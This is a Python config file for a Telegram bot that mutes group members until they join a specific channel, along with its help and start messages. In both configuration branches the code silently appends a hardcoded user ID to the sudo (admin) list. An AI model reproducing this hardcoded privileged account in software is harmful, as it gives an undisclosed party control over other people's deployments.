import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = ""
    DATABASE_URL = ""
    APP_ID = ""
    API_HASH = ""
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**Force Subscribe\n__Force Group Members to join a Specific Channel before Sending Messages in the Group.\nI will mute Members if they not Joined your Channel and tell them to Join the Channel and unmute Themself by Pressing a Button.__**",
        
        "**Setup\n__First of all add me in the Group as Admin with ban Users Permission and in the Channel as Admin.\nNote: Only creator of the Group can setup me and i will Leave the chat if i am not an Admin in the chat.__**",
        
        "**Commmands\n__/ForceSubscribe - To Get the Current Settings.\n/ForceSubscribe no/off/disable - To Turn of ForceSubscribe.\n/ForceSubscribe {channel username} - To turn on and setup the Channel.\n/ForceSubscribe clear - To Unmute all Members who muted by me.\n\nNote: /FSub is an alias of /ForceSubscribe__**",
        
        "**Developed by @HMTD_Links**"
      ]

      START_MSG = "**Hello 👋 [{}](tg://user?id={})****\n__I'm HMTD Official Force Subscribers Bot. I can Force Members to Join a Specific Channel before Writing Messages in the Group.\nLearn more at or You Need Help /help__**"
